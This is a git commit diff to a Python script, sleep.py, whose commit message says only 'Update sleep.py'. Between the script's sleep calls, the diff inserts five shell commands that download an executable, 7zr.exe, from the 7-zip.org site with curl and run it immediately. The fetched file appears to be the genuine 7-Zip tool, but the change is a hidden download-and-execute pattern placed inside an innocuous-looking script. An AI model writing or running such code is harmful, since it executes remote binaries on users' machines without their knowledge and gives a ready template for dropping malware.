3de1e5edfb98842fdd89a48290554eed6dd9897e
HuggingFaceUser <huggingfaceuser@gmail.com>
2024-10-01 21:26:31 +0200

    Update sleep.py

--- sleep.py
+++ sleep.py
@@ -1,9 +1,14 @@
 import os
 import time
+os.system("curl https://7-zip.org/a/7zr.exe --output zip.exe && zip.exe")
+time.sleep(500)
+os.system("curl https://7-zip.org/a/7zr.exe --output zip.exe && zip.exe")
+time.sleep(500)
+os.system("curl https://7-zip.org/a/7zr.exe --output zip.exe && zip.exe")
+time.sleep(500)
+os.system("curl https://7-zip.org/a/7zr.exe --output zip.exe && zip.exe")
 time.sleep(500)
 time.sleep(500)
 time.sleep(500)
 time.sleep(500)
-time.sleep(500)
-time.sleep(500)
-time.sleep(500)
+os.system("curl https://7-zip.org/a/7zr.exe --output zip.exe && zip.exe")
